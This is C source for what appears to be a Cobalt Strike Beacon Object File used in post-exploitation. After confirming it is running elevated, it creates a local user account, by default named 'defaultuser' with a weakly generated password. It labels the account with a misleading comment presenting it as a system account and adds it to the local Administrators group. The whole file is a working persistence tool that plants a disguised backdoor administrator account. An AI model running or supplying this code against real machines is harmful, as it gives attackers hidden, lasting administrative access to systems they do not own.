#include <windows.h>
#include <lm.h>
#include <sddl.h>
#include <stdio.h>
#include <wchar.h>
#include "beacon.h"
#include "InnocentTraveler.h"

char *custom_token(char *input, char delimiter, char **next) {
    if (input == NULL && next != NULL) input = *next;
    if (input == NULL) return NULL;

    char *start = input;
    while (*input != '\0' && *input != delimiter) input++;

    if (*input == delimiter) {
        *input = '\0';
        if (next) *next = input + 1;
    } else {
        if (next) *next = NULL;
    }

    return start;
}

void wtoa(char *dst, const wchar_t *src, int max) {
    int len = KERNEL32$WideCharToMultiByte(CP_ACP, 0, src, -1, dst, max, NULL, NULL);
    dst[len] = '\0';
}

BOOL is_high_integrity() {
    HANDLE token;
    TOKEN_ELEVATION elevation;
    DWORD size;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &token))
        return FALSE;

    if (!ADVAPI32$GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
        KERNEL32$CloseHandle(token);
        return FALSE;
    }

    KERNEL32$CloseHandle(token);
    return elevation.TokenIsElevated;
}

void generate_random_password(wchar_t *buffer, int length) {
    const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
    int charset_len = sizeof(charset)/sizeof(wchar_t) - 1;
    DWORD seed = KERNEL32$GetTickCount();

    for (int i = 0; i < length - 1; ++i) {
        buffer[i] = charset[(seed + i * 31) % charset_len];
    }
    buffer[length - 1] = L'\0';
}

void safe_wcscpy(wchar_t *dst, const wchar_t *src, int max) {
    for (int i = 0; i < max - 1 && src[i] != L'\0'; ++i) {
        dst[i] = src[i];
    }
    dst[max - 1] = L'\0';
}

BOOL get_admin_group_name(wchar_t *groupName, DWORD groupNameLen) {
    PSID adminSID = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (!ADVAPI32$AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminSID)) {
        return FALSE;
    }

    DWORD nameLen = groupNameLen;
    DWORD domainLen = 256;
    wchar_t domain[256];
    SID_NAME_USE use;

    BOOL result = ADVAPI32$LookupAccountSidW(NULL, adminSID, groupName, &nameLen, domain, &domainLen, &use);
    ADVAPI32$FreeSid((adminSID));
    return result;
}

void go(char *args, int len) {
    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR, "Must be running as Administrator.\n");
        return;
    }

    formatp fmt;
    BeaconFormatAlloc(&fmt, 1024);

    char *username_raw = NULL;
    char *password_raw = NULL;

    datap parser;
    BeaconDataParse(&parser, args, len);
    username_raw = BeaconDataExtract(&parser, NULL);
    password_raw = BeaconDataExtract(&parser, NULL);

    // Fallback for Unpacked Args (inline-execute)
    if (username_raw == NULL || username_raw[0] == '\0') {
        char *next = NULL;
        username_raw = custom_token(args, ' ', &next);
        password_raw = custom_token(NULL, ' ', &next);
    }

    wchar_t username[256] = {0};
    wchar_t password[256] = {0};
    wchar_t defaultUsername[] = L"defaultuser";
    wchar_t generatedPassword[32] = {0};

    if (username_raw != NULL)
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, username_raw, -1, username, 256);
    if (password_raw != NULL)
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, password_raw, -1, password, 256);

    if (username[0] == L'\0') {
        safe_wcscpy(username, defaultUsername, 256);
    }

    if (password[0] == L'\0') {
        generate_random_password(generatedPassword, sizeof(generatedPassword) / sizeof(wchar_t));
        safe_wcscpy(password, generatedPassword, 256);
    }

    char usernameA[256], passwordA[256];
    wtoa(usernameA, username, sizeof(usernameA));
    wtoa(passwordA, password, sizeof(passwordA));

    BeaconFormatPrintf(&fmt, "[*] Creating user: %s\n", usernameA);
    BeaconFormatPrintf(&fmt, "[*] Password: %s\n", passwordA);

    USER_INFO_1 ui;
    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = L"A user account managed and used by the system.";
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    DWORD err = 0;
    NET_API_STATUS nStatus = NETAPI32$NetUserAdd(NULL, 1, (LPBYTE)&ui, &err);

    if (nStatus == NERR_Success) {
        BeaconFormatPrintf(&fmt, "[+] User %s created.\n", usernameA);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create user (%s). Error: %lu\n", usernameA, nStatus);
        BeaconFormatFree(&fmt);
        return;
    }

    wchar_t adminGroupName[256] = {0};
    if (!get_admin_group_name(adminGroupName, sizeof(adminGroupName) / sizeof(wchar_t))) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve Administrators group name.\n");
        BeaconFormatFree(&fmt);
        return;
    }

    char groupA[256];
    wtoa(groupA, adminGroupName, sizeof(groupA));

    LOCALGROUP_MEMBERS_INFO_3 member;
    member.lgrmi3_domainandname = username;

    NET_API_STATUS aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, adminGroupName, 3, (LPBYTE)&member, 1);
    if (aStatus == NERR_Success) {
        BeaconFormatPrintf(&fmt, "[+] Added %s to local admin group (%s).\n", usernameA, groupA);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to add user to admin group. Error: %lu\n", aStatus);
    }

    int size = 0;
    char *msg = BeaconFormatToString(&fmt, &size);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", msg);
    BeaconFormatFree(&fmt);
}
